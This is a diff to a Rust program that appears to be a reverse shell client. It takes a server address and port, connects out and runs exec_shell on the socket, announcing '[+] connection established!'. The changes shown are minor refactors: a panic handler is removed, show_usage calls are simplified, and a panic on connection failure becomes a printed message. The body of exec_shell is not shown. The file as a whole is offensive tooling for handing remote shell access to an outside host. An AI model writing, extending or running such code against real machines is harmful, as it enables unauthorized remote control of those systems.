@@ -5,7 +5,7 @@ use std::process::{exit, Command, Stdio};
 use getopts::Options;
 
 mod common;
-use common::{set_panic_handler, show_usage};
+use common::show_usage;
 
 fn parse_args() -> Option<(String, u16)> {
     let mut opts = Options::new();
@@ -16,14 +16,14 @@ fn parse_args() -> Option<(String, u16)> {
     opts.optflag("h", "help", "Show this message");
 
     if args.len() == 1 {
-        show_usage(args[0].as_str(), opts);
+        show_usage(&args[0], opts);
         return None
     }
 
     let parsed_opts = opts.parse(&args[1..]).unwrap();
     if ! parsed_opts.opt_present("s") || ! parsed_opts.opt_present("p")
         || parsed_opts.opt_present("h") {
-        show_usage(args[0].as_str(), opts);
+        show_usage(&args[0], opts);
         return None
     }
 
@@ -53,13 +53,11 @@ fn run(addr: String, port: u16) {
             println!("[+] connection established!");
             exec_shell(sock.as_raw_fd())
         },
-        Err(_) => panic!("[-] fail to connect to server!")
+        Err(_) => println!("[-] fail to connect to server!")
     }
 }
 
 fn main() {
-    set_panic_handler();
-
     match parse_args() {
         Some((addr, port)) => run(addr, port),
         None => exit(1)
